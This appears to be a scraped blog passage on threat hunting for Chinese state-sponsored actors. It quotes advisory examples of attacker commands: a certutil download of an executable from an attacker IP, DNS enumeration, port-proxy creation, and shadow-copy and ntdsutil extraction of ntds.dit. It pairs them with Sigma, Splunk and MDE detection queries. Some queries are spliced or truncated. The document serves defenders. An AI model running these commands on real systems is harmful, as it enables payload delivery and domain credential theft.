lateral movement, and collection activities</h2><p id="ff44" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">This hunting guide is developed to find Chinese APT and other threat actors. Therefore, the Advisory AA23–144a, MITRE ATT&amp;CK research and Cybersecurity Advisory on Chinese state-sponsored cyber operations: observed TTPs is used as a starting point to develop the hunting field manual.</p><h2 id="3cda" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">certutil</h2><blockquote class="oi oj ok"><p id="1eb9" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Within a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor with a different C2 address that uses Microsoft CertUtil, a common <a class="af or" href="https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation" rel="noopener ugc nofollow" target="_blank"><strong class="nr gw">TTP that we’ve observed APT41 use in past intrusions</strong></a>, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The <a class="af or" href="https://www.mandiant.com/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html" rel="noopener ugc nofollow" target="_blank"><strong class="nr gw">usage of VMProtected binaries</strong></a> is another very common TTP that we’ve observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="1725" class="pb mu gv oy b bg pc pd l pe pf">certutil -urlcache -split -f http://91.208.184[.]78/2.exe</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/network_connection/net_connection_win_certutil_initiated_connection.yml at…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qa l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="e020" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="71cb" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND (Image=”*\\certutil.exe” AND Initiated=”true” AND (DestinationPort=”80&quot; OR DestinationPort=”135&quot; OR DestinationPort=”443&quot; OR DestinationPort=”445&quot;))</span></pre><h2 id="ad20" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">dnscmd</h2><p id="2eb3" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Enumeration of the Environment</p><p id="7713" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">The following commands were used by the actor to enumerate the network topology [T1016], the active directory structure [T1069.002], and other information about the target environment [T1069.001], [T1082]:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="5919" class="pb mu gv oy b bg pc pd l pe pf">dnscmd . /enumrecords /zone {REDACTED}</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="a567" class="pb mu gv oy b bg pc pd l pe pf">dnscmd . /enumzones</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="67cf" class="pb mu gv oy b bg pc pd l pe pf">dnscmd . /enumzones dnscmd /enumrecords {REDACTED} . /additional</span></pre><p id="4ad3" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pg ph pi pj pk pl"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Sigma Rules Threat Intelligence, Threat Hunting. class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qh l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="252b" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">MDE:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="53e8" class="pb mu gv oy b bg pc pd l pe pf">DeviceProcessEvents | where ((FolderPath endswith @’\cmd.exe’ or InitiatingProcessVersionInfoOriginalFileName =~ @’cmd.exe’ or ProcessVersionInfoOriginalFileName =~ @’cmd.exe’) and (ProcessCommandLine contains @’netsh ‘ and ProcessCommandLine contains @’interface ‘ and ProcessCommandLine contains @’portproxy ‘ and (ProcessCommandLine contains @’add ‘ or ProcessCommandLine contains @’listenport ‘ or ProcessCommandLine contains @’connetaddress= ‘ or ProcessCommandLine contains @’connectport=1433&#x27;)))</span></pre><p id="efce" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="c0f7" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((Image=”*\\cmd.exe” OR OriginalFileName=”cmd.exe”) AND ((CommandLine=”*netsh *”) AND (CommandLine=”*interface *”) AND (CommandLine=”*portproxy *”) AND (CommandLine=”*add *” OR CommandLine=”*listenport *” OR CommandLine=”*connetaddress= *” OR CommandLine=”*connectport=1433*”)))</span></pre><blockquote class="oi oj ok"><p id="6e15" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Where is replaced with an IPv4 address internal to the network, omitting the &lt; &gt;’s. Netsh is a built-in Windows command line scripting utility that can display or modify the network settings of a host, including the Windows Firewall. The portproxy add command is used to create a host:port proxy that will forward incoming connections on the provided listenaddress and listenport to the connectaddress and connectport. <strong class="nr gw">Administrative privileges are required to execute the portproxy</strong> command. Each portproxy command above will create a registry key…</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="e97a" class="pb mu gv oy b bg pc pd l pe pf">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp\</span></pre><blockquote class="oi oj ok"><p id="f91f" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Defenders should look for the presence of keys in this path and <strong class="nr gw">investigate any anomalous entries</strong>. Note: Using port proxies is not common for legitimate system administration since they can constitute a backdoor into the network that bypasses firewall policies. Administrators should limit port proxy usage within environments and only enable them for the period of time in which they are required. Defenders should also use unusual IP addresses and ports in the command lines or registry entries to identify other hosts that are potentially included in actor actions. <strong class="nr gw">All hosts on the network should be examined for new and unusual firewall and port forwarding rules</strong>, as well as IP addresses and ports specified by the actor. If network traffic or logging is available, defenders should attempt to identify what traffic was forwarded though the port proxies to aid in the hunt operation. As previously mentioned, identifying the associated user account that made the networking changes can also aid in the hunt operation. Firewall rule additions and changes can be viewed in Windows Event Viewer by navigating to: <strong class="nr gw">Applications and Service Logs | Microsoft | Windows | Windows Firewall With Advanced Security | Firewall</strong>. In addition to host-level changes, defenders should review perimeter firewall configurations <strong class="nr gw">for unauthorized changes and/or entries that may permit external connections to internal hosts</strong>. The actor is known to target perimeter devices in their operations. Firewall logs should be reviewed for any connections to systems on the ports listed in any portproxy commands discovered.</p></blockquote><h2 id="ea15" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">nltest</h2><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_execution.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/process_creation/proc_creation_win_nltest_execution.yml at master ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. oa ng op oc od nk oq of og oh go bk">The actor has used the following PowerShell [T1059.001] command to identify successful logons to the host [T1033]:</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="f30c" class="pb mu gv oy b bg pc pd l pe pf">Get-EventLog security -instanceid 4624</span></pre><blockquote class="oi oj ok"><p id="3a89" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Note: Event ID 4624 is logged when a user successfully logs on to a host and contains useful information such as the logon type (e.g., interactive or networking), associated user and computer account names, and the logon time. Event ID 4624 entries can be viewed in Windows Event Viewer by navigating to: <strong class="nr gw">Windows Logs | Security. PowerShell logs can be viewed in Event Viewer: Applications and Service Logs | Windows PowerShell</strong>. This command identifies what user account they are currently leveraging to access the network, identify other users logged on to the host, or identify how their actions are being logged. If the actor is using a password spray technique [T1110.003], there may be several failed logon (Event ID 4625) events for several different user accounts, followed by one or more successful logons (Event ID 4624) within a short period of time. This period may vary by actor but can range from a few seconds to a few minutes. If the actor is using brute force password attempts [T1110] against a single user account, there may be several Event ID 4625 entries for that account, followed by a successful logon Event ID 4624. Defenders should also look for abnormal account activity, such as logons outside of normal working hours and impossible time-anddistance logons (e.g., a user logging on from two geographically separated locations at the same time).</p></blockquote><p id="418e" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Sigma Rule — LOLBAS Chinese APT successful Logon on Host</p><div class="pg ph pi pj pk pl"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/LOLBAS%20Chinese%20APT%20Succesful%20Logon%20on%20Host.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">Sigma-Rules/LOLBAS Chinese APT Succesful Logon on Host.yml at main · Schmouni242/Sigma-Rules</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qg l qb qc qd pz qe ma pl"></div></div></div></a></div><h2 id="75b2" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">wevtutil</h2><p id="f1bd" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Sigma Rule — Hunting Query Chinese APT Enumeration of the Environment</p><div class="pg ph pi pj pk pl"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/main/Hunting%20Query%20Chinese%20APT%20Enumeration%20of%20the%20Environment.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">Sigma-Rules/Hunting Query Chinese APT Enumeration of the Environment.yml at main ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qg l qb qc qd pz qe ma pl"></div></div></div></a></div><h2 id="a81d" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Windows Management Instrumentation WMI/WMIC</h2><p id="032f" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Windows management instrumentation (WMI/WMIC) The actor has executed the following command to gather information about local drives [T1082]:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="0560" class="pb mu gv oy b bg pc pd l pe pf">cmd.exe /C “wmic path win32_logicaldisk get caption,filesystem,freespace,size,volumename”</span></pre><blockquote class="oi oj ok"><p id="222b" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">This command does not require administrative credentials to return results. The command uses a command prompt [T1059.003] to execute a Windows Management Instrumentation Command Line (WMIC) query, collecting information about the storage devices on the local host, including drive letter, file system (e.g., new technology file system [NTFS]), free space and drive size in bytes, and an optional volume name. Windows Management Instrumentation (WMI) is a built-in Windows tool that allows a user to access management information from hosts in an enterprise environment. The command line version of WMI is called WMIC. By default, WMI Tracing is not enabled, so the WMI commands being executed and the associated user might not be available. Additional information on WMI events and tracing can be found in the References section of the advisory.</p></blockquote><h2 id="9770" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Ntdsutil.exe</h2><blockquote class="oi oj ok"><p id="7685" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">The actor may try to exfiltrate the ntds.dit file and the SYSTEM registry hive from Windows domain controllers (DCs) out of the network to perform password cracking [T1003.003]. (The ntds.dit file is the main Active Directory (AD) database file and, by default, is stored at <strong class="nr gw">%SystemRoot%\NTDS\ntds.dit</strong>. This file contains information about users, groups, group memberships, and password hashes for all users in the domain; the SYSTEM registry hive contains the boot key that is used to encrypt information in the ntds.dit file.) Although the ntds.dit file is locked while in use by AD, a copy can be made by creating a Volume Shadow Copy and extracting the ntds.dit file from the Shadow Copy. The SYSTEM registry hive may also be obtained from the Shadow Copy. The following example commands show the actor creating a Shadow Copy and then extracting a copy of the ntds.dit file from it</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="3251" class="pb mu gv oy b bg pc pd l pe pf">cmd /c vssadmin create shadow /for=C: &gt; C:\Windows\Temp\.tmp</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="7ecb" class="pb mu gv oy b bg pc pd l pe pf">cmd /c copy</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="b0e9" class="pb mu gv oy b bg pc pd l pe pf">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTD S\ntds.dit C:\Windows\Temp &gt; C:\Windows\Temp\.tmp</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml at master ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qn l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="f497" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="a2ac" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND (((Image=”*\\powershell.exe” OR Image=”*\\pwsh.exe” OR Image=”*\\wmic.exe” OR Image=”*\\vssadmin.exe”) OR (OriginalFileName=”PowerShell.EXE” OR OriginalFileName=”pwsh.dll” OR OriginalFileName=”wmic.exe” OR OriginalFileName=”VSSADMIN.EXE”)) AND ((CommandLine=”*shadow*”) AND (CommandLine=”*create*”)))</span></pre><p id="b7b4" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">MDE:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="16b4" class="pb mu gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (((FolderPath endswith @’\powershell.exe’ or FolderPath endswith @’\pwsh.exe’ or FolderPath endswith @’\wmic.exe’ or FolderPath endswith @’\vssadmin.exe’) or InitiatingProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’) or ProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’, @’wmic.exe’, @’VSSADMIN.EXE’)) and (ProcessCommandLine contains @’shadow’ and ProcessCommandLine contains @’create’))</span></pre><blockquote class="oi oj ok"><p id="36ba" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">The built-in Ntdsutil.exe tool performs all these actions using a single command. There are several ways to execute Ntdsutil.exe, including running from an <strong class="nr gw">elevated command prompt</strong> (cmd.exe), using WMI/WMIC, or PowerShell. Defenders should look for the execution of Ntdsutil.exe commands using long, short, or a combination of the notations. For example, the long notation command activate instance <strong class="nr gw">ntds ifm</strong> can also be executed using the short notation <strong class="nr gw">ac i ntds i.</strong> Table 1 provides the long and short forms of the arguments used in the sample Ntdsutil.exe command, along with a brief description of the arguments.</p></blockquote><h2 id="aba2" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">ntdsutil and wmic</h2><blockquote class="oi oj ok"><p id="b287" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">The actor has executed WMIC commands [T1047] to create a copy of the ntds.dit file and SYSTEM registry hive using ntdsutil.exe. Each of the following actor commands is a standalone example; multiple examples are provided to show how syntax and file paths may differ per environment.</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="d81c" class="pb mu gv oy b bg pc pd l pe pf">wmic process call create “ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\pro</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="cfab" class="pb mu gv oy b bg pc pd l pe pf">wmic process call create “cmd.exe /c ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\Pro”</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="5f87" class="pb mu gv oy b bg pc pd l pe pf">wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\”</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="6b3c" class="pb mu gv oy b bg pc pd l pe pf">“cmd.exe” /c wmic process call create “cmd.exe /c mkdir C:\windows\Temp\McAfee_Logs &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\McAfee_Logs\”</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="b384" class="pb mu gv oy b bg pc pd l pe pf">cmd.exe /Q /c wmic process call create “cmd.exe /c mkdir C:\Windows\Temp\tmp &amp; ntdsutil \”ac i ntds\” ifm \”create full C:\Windows\Temp\tmp\” 1&gt; \\127.0.0.1\ADMIN$\ 2&gt;&amp;1</span></pre><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntds.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/process_creation/proc_creation_win_susp_ntds.yml at master · SigmaHQ/sigma</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. above creates a copy of the ntds.dit database and the SYSTEM and SECURITY registry hives in the <strong class="nr gw">C:\Windows\Temp\ </strong>directory, where is replaced with the path specified in the command (e.g., pro, tmp, or McAfee_Logs). By default, the hidden ADMIN$ share is mapped to <strong class="nr gw">C:\Windows\,</strong> so the last command will direct standard output and error messages from the command to a file within the folder specified. The actor has also saved the files directly to the <strong class="nr gw">C:\Windows\Temp</strong> and <strong class="nr gw">C:\Users\Public</strong> directories, so the entirety of those directory structures should be analyzed.</p><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_parent_process.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/file/file_event/file_event_win_ntds_dit_uncommon_parent_process.yml at master ·…</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. ((ParentImage=”*\\cscript.exe” OR ParentImage=”*\\httpd.exe” OR ParentImage=”*\\nginx.exe” OR ParentImage=”*\\php-cgi.exe” OR ParentImage=”*\\powershell.exe” OR ParentImage=”*\\pwsh.exe” OR or InitiatingProcessFolderPath endswith @’\mshta.exe’ or InitiatingProcessFolderPath endswith @’\powershell.exe’ or InitiatingProcessFolderPath endswith @’\pwsh.exe’ or InitiatingProcessFolderPath endswith @’\regsvr32.exe’ or InitiatingProcessFolderPath endswith @’\rundll32.exe’ or InitiatingProcessFolderPath endswith @’\wscript.exe’ or InitiatingProcessFolderPath endswith @’\wsl.exe’ or @’\Public\’ or InitiatingProcessFolderPath contains @’\PerfLogs\’)))</span></pre><p id="34ad" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk 2:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="b2f7" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND (TargetFilename=”*\\ntds.dit” AND ((Image=”*\\cmd.exe” OR Image=”*\\cscript.exe” OR Image=”*\\mshta.exe” OR Image=”*\\powershell.exe” OR Image=”*\\pwsh.exe” OR Image=”*\\regsvr32.exe” OR Image=”*\\rundll32.exe” OR Image=”*\\wscript.exe” OR Image=”*\\wsl.exe” OR Image=”*\\wt.exe”) OR (Image=”*\\AppData\\*” OR Image=”*\\Temp\\*” OR Image=”*\\Public\\*” OR Image=”*\\PerfLogs\\*”)))</span></pre><p id="d40d" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network. Please read also my article <a class="af or" rel="noopener" href="/detect-fyi/sensor-mappings-to-att-ck-smap-a-concrete-example-of-how-to-use-the-smap-for-a-real-world-700e53ed1c48">Sensor Mappings to ATT&amp;CK (SMAP) — a concrete example of how to use the SMAP for a real world adversary behavior</a> to get a deep technical understanding about it how threat actor abuse ntds.dit and ntdsutil and how you can prevent and detect it.</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="1c6c" class="pb mu gv oy b bg pc pd l pe pf">\Active Directory\ntds.dit \</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="7c82" class="pb mu gv oy b bg pc pd l pe pf">Active Directory\ntds.jfm</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="e209" class="pb mu gv oy b bg pc pd l pe pf">\registry\SECURITY</span></pre><pre class="qf ox oy oz bp pa bb bk"><span id="c34b" class="pb mu gv oy b bg pc pd l pe pf">\registry\SYSTEM</span></pre><blockquote class="oi oj ok"><p id="8343" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to: <strong class="nr gw">Windows Logs | Application</strong>. To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to <strong class="nr gw">ID numbers 216, 325, 326, and 327</strong>. Clicking the OK box will apply the filters to the results. Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference ntds.dit. If such events are present, the events’ details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised — or actor-created — user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor’s actions.</p><p id="4b01" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and/or join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA’s Eviction Guidance for Network Affected by the SolarWinds and Active Directory/M365 Compromise. In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="1d66" class="pb mu gv oy b bg pc pd l pe pf">Secretsdump.py</span></pre><p id="d9fd" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">This script is a component of Impacket, which the actor has been known to use</p><p id="02e0" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">· Invoke-NinjaCopy (PowerShell)</p><p id="9283" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">· DSInternals (PowerShell)</p><p id="68e3" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">· FgDump</p><p id="35a6" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">· Metasploit</p><p id="f146" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">If you don’t use such tools, the recommendation would be to block them as a great opportunity to set choke points.</p><div class="pg ph pi pj pk pl"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/security/win_security_impacket_secretdump.yml?source=post_page-----379a6b950492--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pm ab jf"><div class="pn ab co cb po pp"><h2 class="bf gw iw z pq pr ps pt pu pv pw gu bk">sigma/rules/windows/builtin/security/win_security_impacket_secretdump.yml at master · SigmaHQ/sigma</h2><div class="px l"><h3 class="bf b iw z pq pr ps pt pu pv pw du">Main Sigma Rule Repository. Contribute to SigmaHQ/sigma development by creating an account on GitHub.</h3></div><div class="py l"><p class="bf b dv z pq pr ps pt pu pv pw du">github.com</p></div></div><div class="pz l"><div class="qq l qb qc qd pz qe ma pl"></div></div></div></a></div><p id="667d" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="3e24" class="pb mu gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:Security” AND (EventCode=”5145&quot; AND ShareName=”\\\\\*\\ADMIN$” AND (RelativeTargetName=”*SYSTEM32\\*”) AND (RelativeTargetName=”*.tmp*”))</span></pre><p id="d8ca" class="pw-post-body-paragraph np nq gv nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.</p><h2 id="0154" class="mt mu gv bf mv mw mx dy my mz na ea nb nc nd ne nf ng nh ni nj nk nl nm nn no bk">Data Sources for NTDS.dit</h2><p id="d4ab" class="pw-post-body-paragraph np nq gv nr b ht ns nt nu hw nv nw nx nc ny nz oa ng ob oc od nk oe of og oh go bk">Command Execution</p><blockquote class="oi oj ok"><p id="b50f" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Monitor executed commands and arguments that may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. Look for command-lines that invoke attempts to access or copy the NTDS.dit.</p><p id="2e36" class="np nq ol nr b ht om nt nu hw on nw nx nc oo nz oa ng op oc od nk oq of og oh go bk">Note: Events 4688 (Microsoft Windows Security Auditing) and 1 (Microsoft Windows Sysmon) provide context of commands and parameters being executed via creation of a new process. Event 800 (PowerShell) provides context of commands and parameters being executed via PowerShell. This detection is based on known Windows utilities commands and parameters that can be used to copy the ntds.dit file. It is recommended to keep the list of commands and parameters up to date.</p></blockquote><p id="df0d" class="pw-post-body-paragraph np nq 